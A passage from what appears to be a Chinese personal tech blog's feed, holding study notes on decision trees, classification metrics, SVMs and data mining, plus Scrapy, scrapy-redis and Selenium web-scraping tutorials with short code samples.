})=\frac{\operatorname{Gain}(\mathrm{D},\mathrm{a})}{\mathrm{IV}(\mathrm{a})}\]</span></p><p>其中， <span class="math display">\[\mathrm{IV}(\mathrm{a})=-\sum_{\mathrm{v}=1}^{\mathrm{V}}\frac{\left|\mathrm{D}^{\mathrm{v}}\right|}{|\mathrm{D}|} \log _2\frac{\left|\mathrm{D}^{\mathrm{v}}\right|}{|\mathrm{D}|}\]</span></p><ul><li>除以IV可以看做是一个归一化（标准化）过程，这里，属性a的可能取值数目越多，IV（a）值越大，信息增益除以IV后值越小，抵消了分支多的好处。但是这样一来，增益率会偏好分支少的属性，C4.5采用两步对此进行了折中改进：<ul><li>先对所有属性的信息增益进行从高到低排序，从候选划分属性中选出信息增益高于平均水平的</li><li>然后从中选出增益率高的</li></ul></li></ul><h1 id="基尼指数gini-index--cart决策树">5 基尼指数（Gini Index）-CART决策树</h1><ul><li><p>CART（Classification and RegressionTree）决策树使用基尼指数来选择划分属性，从属性集A中选择基尼指数最小的属性作为最优划分属性。从统计建模的角度出发考虑问题，前面都是用信息论角度去考虑。该算法既可用于分类，又可用于回归。</p></li><li><p>数据集D的纯度，用基尼值度量为（值越小，纯度越高）： <spanclass="math display">\[\operatorname{Gini}(\mathrm{D})=\sum_{\mathrm{k}=1}^{|\mathrm{y}|}\sum_{\mathrm{k}^{\prime} \neq \mathrm{k}} \mathrm{p}_{\mathrm{k}}\mathrm{p}_{\mathrm{k}}^{\prime}=1-\sum_{\mathrm{k}=1}^{|\mathrm{y}|}\mathrm{p}_{\mathrm{k}}^2\]</span></p></li><li><p>属性a的基尼指数定义为： <span class="math display">\[\operatorname{Gini} \_\operatorname{index}(\mathrm{D},\mathrm{a})=\sum_{\mathrm{v}=1}^{\mathrm{V}}\frac{\left|\mathrm{D}^{\mathrm{v}}\right|}{|\mathrm{D}|}\operatorname{Gini}(\mathrm{D})\]</span></p></li></ul><h1 id="剪枝pruning">6 剪枝（pruning）</h1><p>在上面我们提到了信息增益、增益率、基尼系数三个不同的划分属性，有人会疑惑，不同的划分原则是否会对结果产生影响，研究表明划分选择的各种准则虽然对决策树的尺寸有较大的影响，但对泛化性能的影响有限。相比而言，剪枝方法和程度对决策树泛化性能的影响更为显著。决策树从上到下划分实际上完成的是从全部到局部的划分，分到局部时可能会受到噪音的影响，容易产生不必要的分枝而过拟合，剪枝是决策树对付“过拟合”的主要手段。</p><h2 id="预剪枝prepruning">6.1 预剪枝（prepruning）</h2><p>指在决策树生成过程中，对每个结点在划分前先进行估计，若当前结点的划分不能带来决策树泛化性能提升，则停止划分并将当前结点标记为叶结点。示例：划分后精度变低了，则不划分进行剪枝，划分后精度没变化，遵循奥卡姆剃刀原则，不划分。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550550.png"alt="image-20231009154011573" /><figcaption aria-hidden="true">image-20231009154011573</figcaption></figure><h2 id="后剪枝postpruning">6.2 后剪枝（postpruning）</h2><p>后剪枝是指先从训练集生成一棵完整的决策树，然后自底向上地对非叶结点进行考察，若将该结点对应的子树替换为叶结点能带来决策树泛化性能提升，则将该子树替换为叶结点。示例：由下到上，每一个结点都要考察是否剪，如果剪前剪后没有变化则不剪。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550551.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550552.png"alt="image-20231009154708121" /><figcaption aria-hidden="true">image-20231009154708121</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550553.png"alt="image-20231009154730453" /><figcaption aria-hidden="true">image-20231009154730453</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550554.png"alt="image-20231009154751919" /><figcaption aria-hidden="true">image-20231009154751919</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550555.png"alt="image-20231009154800431" /><figcaption aria-hidden="true">image-20231009154800431</figcaption></figure><h2 id="预剪枝vs后剪枝">6.3 预剪枝VS后剪枝</h2><p>（1）时间开销</p><ul><li>预剪枝：测试时间开销降低，训练时间开销降低</li><li>后剪枝：测试时间开销降低，训练时间开销增加</li></ul><p>（2）过/欠拟合风险：</p><ul><li>预剪枝：过拟合风险降低，欠拟合风险增加</li><li>后剪枝：过拟合风险降低，欠拟合风险基本不变</li></ul><p>（3）泛化性能：后剪枝通常优于预剪枝</p><p>参考教程：</p><ol type="1"><li><ahref="https://www.bilibili.com/video/BV1Xp4y1U7vW/?spm_id_from=333.788.recommend_more_video.-1&amp;vd_source=5a5397ea8e931fbb28195dfdfa5e1b03">【五分钟机器学习】可视化的决策过程：决策树Decision Tree_哔哩哔哩_bilibili</a></li><li><ahref="https://blog.csdn.net/weixin_43182102/article/details/122106265">【机器学习sklearn】决策树（DecisionTree）算法-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
      <category>算法篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>准确率、精确率、召回率</title>
    <link href="/2023/10/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%90%86%E8%AE%BA%E7%AF%87/%E5%87%86%E7%A1%AE%E7%8E%87%E3%80%81%E7%B2%BE%E7%A1%AE%E7%8E%87%E3%80%81%E5%8F%AC%E5%9B%9E%E7%8E%87/"/>
    <url>/2023/10/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%90%86%E8%AE%BA%E7%AF%87/%E5%87%86%E7%A1%AE%E7%8E%87%E3%80%81%E7%B2%BE%E7%A1%AE%E7%8E%87%E3%80%81%E5%8F%AC%E5%9B%9E%E7%8E%87/</url>
    
    <content type="html"><![CDATA[<h1 id="混淆矩阵">1 混淆矩阵</h1><table><thead><tr class="header"><th></th><th>实际正例</th><th>实际负例</th></tr></thead><tbody><tr class="odd"><td>预测正例</td><td>TP</td><td>FP</td></tr><tr class="even"><td>预测负例</td><td>FN</td><td>TN</td></tr></tbody></table><ul><li>TP（True Positives)：真正例，预测为正例而且实际上也是正例；</li><li>FP（False Positives)：假正例，预测为正例然而实际上却是负例；</li><li>FN（false Negatives)：假负例，预测为负例然而实际上却是正例；</li><li>TN（True Negatives)：真负例，预测为负例而且实际上也是负例。</li></ul><h1 id="准确率">2 准确率</h1><p><span class="math display">\[Accuracy=\frac{TP+TN}{TP+FP+FN+TN}\]</span></p><ul><li>定义：所有的预测正确（正类负类）的占总的比重。</li><li>虽然准确率能够判断总的正确率，但是在样本不均衡的情况下，并不能作为很好的指标来衡量结果。在样本不平衡的情况下，得到的高准确率没有任何意义，此时准确率就会失效。例如如果一个肿瘤科医生看病，不经检验就告诉每个患者他们没有患病，检查的准确率为99.6%！（癌症患病率约为0.4%）。</li></ul><h1 id="精确率">3 精确率</h1><p><span class="math display">\[Precision=\frac{TP}{TP+FP}\]</span></p><ul><li>定义：也叫查准率，即正确预测为正的占全部预测为正的比例(不准错，宁愿漏检，也不能让现有的预测有错)。</li><li>精确率代表对正样本结果中的预测准确程度，准确率则代表整体的预测准确程度，包括正样本和负样本。分母是预测到的正类，精确率的提出是让模型的现有预测结果尽可能不出错。应用场景例如美国刑事审判体系，疑罪从无。</li></ul><h1 id="召回率">4 召回率</h1><p><span class="math display">\[Recall=\frac{TP}{TP+FN}\]</span></p><ul><li>定义：也叫查全率，即正确预测为正的占全部实际为正的比例(不准漏，宁可错杀一千，也不放过一个)。</li><li>召回率(Recall)是针对原样本而言的，其含义是在实际为正的样本中被预测为正样本的概率。高召回率意味着更少的漏检，但会导致更多的误检。应用场景例如癌症筛查、排查安全隐患。</li></ul><h1 id="f-score">5 F-Score</h1><p><span class="math display">\[F_{Score}=(1+\beta^2)\frac{Precision \times Recall}{\beta^2 \timesPrecision+Recall}\]</span></p><ul><li>精确率和召回率互相影响，理想状态下肯定追求两个都高，但是实际情况是两者相互“制约”：追求精确率高，则召回率就低；追求召回率高，则通常会影响精确率。这样就需要综合考虑它们，最常见的方法就是F-score。也可以绘制出P-R曲线图，观察它们的分布情况。</li><li>F-Score：权衡精确率（Precision）和召回率（Recall），较为全面地评价一个分类器。F-Score是精确率和召回率的调和平均。F-Score越大说明模型质量更高。</li><li>关于β取值：<ul><li>β如果取1,表示Precision与Recall一样重要</li><li>β如果取小于1,表示Precision比Recall重要</li><li>β如果取大于1,表示Recall比Precision重要</li></ul></li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://blog.csdn.net/lhxez6868/article/details/108150777">准确度(accuracy)、精确率（precision)、召回率（recall）、F1值谈谈我的看法_精确度和召回率-CSDN博客</a></li><li><ahref="https://zhuanlan.zhihu.com/p/369936908">准确率、精确率、召回率 -知乎 (zhihu.com)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>支持向量机</title>
    <link href="/2023/10/05/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E7%AF%87/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"/>
    <url>/2023/10/05/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E7%AF%87/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="svm直觉理解">1 SVM直觉理解</h1><p>概念：支持向量机<code>Supported Vector Machine</code>，基于线性划分，输出一个最优化的分隔超平面，该超平面不但能将两类正确分开，且使分类间隔最大</p><p>本质：量化两类数据差异</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310051404845.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h1 id="软硬间隔">2 软硬间隔</h1><ul><li>间隔距离体现两类数据差异大小</li><li>硬间隔：使⽤超平⾯进⾏分割数据的过程中，如果我们严格地让所有实例都不在最⼤间隔之间，只位于正确的⼀边。硬间隔分类有两个问题：⾸先，它只在数据是线性可分离的时候才有效；其次，它对异常值⾮常敏感。</li><li>软间隔：软间隔的⽬标是尽可能在保持最⼤间隔宽阔和限制间隔违例之间找到良好的平衡。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310051404846.png"alt="image-20231005102746477" /><figcaption aria-hidden="true">image-20231005102746477</figcaption></figure><h1 id="升维转换和核函数">3 升维转换和核函数</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310051404847.png"alt="image-20231005134734247" /><figcaption aria-hidden="true">image-20231005134734247</figcaption></figure><p>升维转换目的：处理低维度下无法方便分类的数据（直接采用可能导致维数灾难）</p><p>核函数：不用知晓具体的维度转换函数，直接获得数据的高维度差异度</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310051404848.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>参考教程：</p><ol type="1"><li><ahref="https://www.bilibili.com/video/BV16T4y1y7qj/?spm_id_from=333.337.search-card.all.click&amp;vd_source=d1182948f36423c63e7e3b31ad8c5163">【数之道】支持向量机SVM是什么，八分钟直觉理解其本质_哔哩哔哩_bilibili</a></li><li><ahref="https://blog.csdn.net/qq_39763246/article/details/119926367">机器学习算法08 ——支持向量机SVM算法(核函数、手写数字识别案例)_svm算法案例_老板来碗小面加蛋~的博客-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
      <category>算法篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>绪论</title>
    <link href="/2023/10/05/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/%E7%BB%AA%E8%AE%BA/"/>
    <url>/2023/10/05/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/%E7%BB%AA%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="背景">1 背景</h1><ul><li>数据爆炸但知识贫乏</li><li>商业数据到商业智能的进化</li><li>科学发展范式（经验科学、理论科学、计算科学、数据科学）</li></ul><h1 id="基本概念">2 基本概念</h1><p>定义：从数据中得到信息和知识的过程</p><h1 id="主要内容">3 主要内容</h1><ul><li>关联规则挖掘（啤酒和尿布）</li><li>分类<code>Predictive</code>：根据特征和观测数据建立数学模型，对新的数例进行判断的过程（监督式机器学习）<ul><li>标签分类</li><li>数值预测</li></ul></li><li>聚类<code>Descriptive</code>：仅根据刚刚的特征对数据进行聚类划分（非监督式机器学习）</li><li>回归：建立多个变量之间的定量关系</li></ul><p>Q：数据分类和数据聚类的概念如何区别？</p><p>数据分类，分类的类别是已知的，训练某种学习机器（即得到某种目标函数），使它能够对未知类别的样本进行分类；数据聚类，分类的类别是未知的，通过聚类分析将数据聚合成几个群体。</p><p>Q：数据、信息、知识的概念如何区分？</p><ul><li>数据：数据是未经加工处理的原始信息。</li><li>信息：信息是对原始的数据信息进行观察得出的一些结论。</li><li>知识：知识是对信息进行总结归纳，逻辑分析，得到的理解和某些事物的规律。</li></ul>]]></content>
    
    
    <categories>
      
      <category>数据挖掘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>视频网站基本原理</title>
    <link href="/2023/10/04/Python/Spider/video/%E8%A7%86%E9%A2%91%E7%BD%91%E7%AB%99%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"/>
    <url>/2023/10/04/Python/Spider/video/%E8%A7%86%E9%A2%91%E7%BD%91%E7%AB%99%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="视频处理流程">1 视频处理流程</h1><ul><li>用户上传</li><li>转码（高清、标清）</li><li>切片处理（单个文件进行拆分)</li></ul><h1 id="m3u8文件">2 m3u8文件</h1><ul><li>视频播放顺序</li><li>视频存储位置</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310050925393.png"alt="image-20231004161812532" /><figcaption aria-hidden="true">image-20231004161812532</figcaption></figure><h1 id="抓取流程">3 抓取流程</h1><ol type="1"><li>找到m3u8文件</li><li>通过m3u8文件下载到ts文件</li><li>将ts文件合并为一个mp4文件</li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>video</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>分布式爬虫基础</title>
    <link href="/2023/10/04/Python/Spider/Scrapy/%E5%88%86%E5%B8%83%E5%BC%8F%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/10/04/Python/Spider/Scrapy/%E5%88%86%E5%B8%83%E5%BC%8F%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="概念">1 概念</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310041406344.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>搭建一个分布式的机群，让其对一组资源进行分布联合爬取</p><h1 id="作用">2 作用</h1><p>提高爬取数据的效率</p><h1 id="实现">3 实现</h1><ul><li><p>环境准备</p><ul><li>安装<code>scrapy-redis</code>组件（原生的scrapy不能实现分布式爬虫,因为调度器和管道不能被分布式机群共享，所以需要配合该组件进行实现）</li><li><code>scrapy-redis</code>组件作用：给原生的scrapy框架提供可以被共享的调度器和管道</li></ul></li><li><p>实现流程：</p><ul><li><p>创建工程</p></li><li><p>创建爬虫文件</p></li><li><p>修改当前爬虫文件</p><ul><li>导入模块：<code>from scrapy_redis.spiders import RedisSpider</code></li><li>注释allowed_domains和start_urls</li><li>添加属性（共享的调度器队列名称）：<code>redis_key='xxx'</code></li><li>修改父类为：<code>RedisCrawlSpider</code></li></ul></li><li><p>修改配置文件</p><ul><li><p>指定管道</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">ITEM_PIPELINES = &#123;<br>    <span class="hljs-string">&#x27;scrapy_redis.pipelines.RedisPipeline&#x27;</span>:<span class="hljs-number">400</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>指定调度器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 去重容器类：使用Redis的set集合来存储请求的指纹数据，从而实现请求去重的持久化</span><br>DUPEFILTER_CLASS= <span class="hljs-string">&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span><br><span class="hljs-comment"># 使用scrapy_redis组件自己的调度器</span><br>SCHEDULER=<span class="hljs-string">&quot;scrapy_redis.scheduler.Scheduler&quot;</span><br><span class="hljs-comment"># 配置调度器是否持久化，即当爬虫结束，是否清空Redis请求队列和set指纹数据</span><br>SCHEDULER_PERSIST=<span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure></li><li><p>指定redis服务器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">REDIS_HOST=<span class="hljs-string">&#x27;&#x27;</span><br>REDIS_PORT=<br></code></pre></td></tr></table></figure></li></ul></li><li><p>redis相关操作配置</p><ul><li>redis配置文件（redis.windows.conf）</li><li>结合配置文件开启redis服务：<code>redis-server 配置文件</code></li><li>启动客户端：<code>redis-cli</code></li></ul></li><li><p>执行工程：<code>scrapy runspider xxx.py</code>（spider目录下）</p></li><li><p>向调度器队列中放入一个起始url（客户端中执行）：<code>lpush redis_key start_urls</code></p></li></ul></li></ul><h1 id="redis存储的数据">4 redis存储的数据</h1><ul><li><p>spiderName:items</p><ul><li>list类型，保存爬虫获取到的数据item内容是json字符串。</li></ul></li><li><p>spiderName:dupefilter</p><ul><li>set类型，用于爬虫访问的URL去重内容，是40个字符的url的hash字符串</li></ul></li><li><p>spiderName:start_urls</p><ul><li>list类型，用于接收redis spider启动时的第一个url</li></ul></li><li><p>spiderName:requests</p><ul><li>zset类型，用于存放requests等待调度。内容是requests对象的序列化字符串</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基于CrawlSpider的全站数据爬取</title>
    <link href="/2023/10/02/Python/Spider/Scrapy/%E5%9F%BA%E4%BA%8ECrawlSpider%E7%9A%84%E5%85%A8%E7%AB%99%E6%95%B0%E6%8D%AE%E7%88%AC%E5%8F%96/"/>
    <url>/2023/10/02/Python/Spider/Scrapy/%E5%9F%BA%E4%BA%8ECrawlSpider%E7%9A%84%E5%85%A8%E7%AB%99%E6%95%B0%E6%8D%AE%E7%88%AC%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h1 id="概念">1 概念</h1><p>CrawlSpider：Spider的一个子类</p><h1 id="使用">2 使用</h1><ol type="1"><li><p>创建工程</p></li><li><p>cd project</p></li><li><p>创建爬虫文件（CrawlSpider）:<code>scrapy genspider -t crawl spiderName allowed_domains</code></p><ul><li>链接提取器：根据指定规则（allow="正则"）进行指定链接的提取</li><li>规则解析器：将链接提取器提取到的链接进行指定规则（callback）的解析操作</li><li>可以有多个链接提取器，规则解析器</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">from</span> scrapy.linkextractors <span class="hljs-keyword">import</span> LinkExtractor<br><span class="hljs-keyword">from</span> scrapy.spiders <span class="hljs-keyword">import</span> CrawlSpider, Rule<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CrawlspiderSpider</span>(<span class="hljs-title class_ inherited__">CrawlSpider</span>):<br>    name = <span class="hljs-string">&quot;crawlspider&quot;</span><br>    allowed_domains = [<span class="hljs-string">&quot;xxx.com&quot;</span>]<br>    start_urls = [<span class="hljs-string">&quot;http://xxx.com/&quot;</span>]<br><br>    link=LinkExtractor(allow=<span class="hljs-string">r&quot;Items/&quot;</span>)<br>    rules = (<br>        <span class="hljs-comment"># 规则解析器</span><br>        <span class="hljs-comment"># 链接提取器作为一个参数被作用到规则解析器里</span><br>        <span class="hljs-comment"># follow为ture时可以将链接提取器继续作用到链接提取器提取到的链接对应页面中</span><br>        Rule(link, callback=<span class="hljs-string">&quot;parse_item&quot;</span>, follow=<span class="hljs-literal">True</span>),<br>    )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_item</span>(<span class="hljs-params">self, response</span>):<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h1 id="item">3 item</h1><p>当有多个item时，若需要判断item类型，使用：<code>item.__class__.__name__</code></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基本配置（Edge版）</title>
    <link href="/2023/10/02/Python/Spider/selenium/%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE%EF%BC%88Edge%E7%89%88%EF%BC%89/"/>
    <url>/2023/10/02/Python/Spider/selenium/%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE%EF%BC%88Edge%E7%89%88%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<ol type="1"><li><p>安装 selenium</p></li><li><p>下载浏览器引擎（需对应浏览器版本<code>浏览器 --&gt; 设置 --&gt; 关于 Microsoft Edge --&gt; 版本信息</code>）</p></li><li><p>文件重命名为： <code>MicrosoftWebDriver.exe</code></p></li><li><p>拷贝到python.exe目录下（例：<code>F:\Anaconda\install\envs\spider</code>）和浏览器目录下（例：<code>C:\Program Files (x86)\Microsoft\Edge\Application</code>）</p></li><li><p>示例代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><br>driver = webdriver.Edge(<span class="hljs-string">&quot;C:\Program Files (x86)\Microsoft\Edge\Application\MicrosoftWebDriver.exe&quot;</span>)<br>driver.get(<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>)   <span class="hljs-comment"># 你要进入的网页</span><br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>selenium</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基于Spider的全站数据爬取</title>
    <link href="/2023/10/02/Python/Spider/Scrapy/%E5%9F%BA%E4%BA%8ESpider%E7%9A%84%E5%85%A8%E7%AB%99%E6%95%B0%E6%8D%AE%E7%88%AC%E5%8F%96/"/>
    <url>/2023/10/02/Python/Spider/Scrapy/%E5%9F%BA%E4%BA%8ESpider%E7%9A%84%E5%85%A8%E7%AB%99%E6%95%B0%E6%8D%AE%E7%88%AC%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h1 id="概念">1 概念</h1><p>将某网站中某模块下全部页码对应的页面数据进行爬取</p><h1 id="实现方式">2 实现方式</h1><ol type="1"><li><p>将所有页面url添加到start_urls列表中</p></li><li><p>手动实现请求发送（推荐）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">XiaohuaSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;xiaohua&quot;</span><br>    allowed_domains = [<span class="hljs-string">&quot;699pic.com&quot;</span>]<br>    start_urls = [<span class="hljs-string">&quot;https://699pic.com/tupian/photo-264659.html&quot;</span>]<br><br>    <span class="hljs-comment"># 通用url模板</span><br>    url=<span class="hljs-string">&quot;https://699pic.com/photo/264659-%d.html&quot;</span><br>    page_num=<span class="hljs-number">2</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        li_list=response.xpath(<span class="hljs-string">&#x27;/html/body/div[11]/div[4]/div/div&#x27;</span>)<br>        <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> li_list:<br>            img_name=li.xpath(<span class="hljs-string">&#x27;./a/@title&#x27;</span>).extract_first()<br>            <span class="hljs-built_in">print</span>(img_name)<br><br>        <span class="hljs-keyword">if</span> self.page_num &lt;= <span class="hljs-number">3</span>:<br>            new_url=<span class="hljs-built_in">format</span>(self.url%self.page_num)<br>            self.page_num+=<span class="hljs-number">1</span><br>            <span class="hljs-comment"># callback为回调函数，进行数据解析</span><br>            <span class="hljs-keyword">yield</span> scrapy.Request(url=new_url,callback=self.parse)<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>Scrapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>中间件</title>
    <link href="/2023/10/02/Python/Spider/Scrapy/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    <url>/2023/10/02/Python/Spider/Scrapy/%E4%B8%AD%E9%97%B4%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="下载中间件">1 下载中间件</h1><ul><li><p>位置：引擎和下载器之间</p></li><li><p>作用：批量拦截到整个工程中所有的请求和响应</p></li><li><p>拦截请求：</p><ul><li>UA伪装（UA池）:process_request</li><li>代理IP（代理池）:process_exception需要<code>return request</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 拦截请求</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_request</span>(<span class="hljs-params">self, request, spider</span>):<br>      <span class="hljs-comment"># UA伪装</span><br>      request.headers[<span class="hljs-string">&#x27;User-Agent&#x27;</span>]= random.choice(self.user_agents)<br>      <span class="hljs-comment"># 仅测试使用</span><br>      <span class="hljs-comment"># request.meta[&#x27;proxy&#x27;] = &quot;http://182.34.33.244:9999&quot;</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>  <br>  <span class="hljs-comment"># 拦截发生异常的请求</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_exception</span>(<span class="hljs-params">self, request, exception, spider</span>):<br>      <span class="hljs-comment"># 代理池一般在该方法中进行设置</span><br>      <span class="hljs-comment"># request.meta[&#x27;proxy&#x27;]=</span><br>      <span class="hljs-comment"># 重新发送该请求</span><br>      <span class="hljs-keyword">return</span> request<br></code></pre></td></tr></table></figure></li><li><p>拦截响应：</p><ul><li>篡改响应数据（应对动态加载）</li><li>判断网页数据是否为动态加载，可以通过禁用js观察数据是否能够加载出来得到</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_response</span>(<span class="hljs-params">self, request, response, spider</span>):<br>    <span class="hljs-comment"># 获取爬虫类定义的浏览器对象</span><br>    driver=spider.driver<br>    <span class="hljs-comment"># 挑选出指定响应对象进行篡改</span><br>    <span class="hljs-comment"># 挑选过程：url---request---response</span><br>    <span class="hljs-keyword">if</span> request.url <span class="hljs-keyword">in</span> spider.module_urls:<br>        <span class="hljs-comment"># 基于selenium便捷地获取动态加载数据</span><br>        driver.get(request.url)<br>        sleep(<span class="hljs-number">1</span>)<br>        page_text=driver.page_source<br>        <span class="hljs-comment"># 实例化新的响应对象</span><br>        new_response=HtmlResponse(url=request.url,body=page_text,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>,request=request)<br>        <span class="hljs-keyword">return</span> new_response<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure></li><li><p>需要在配置文件中开启中间件</p></li></ul><h1 id="爬虫中间件">2 爬虫中间件</h1>]]></content>
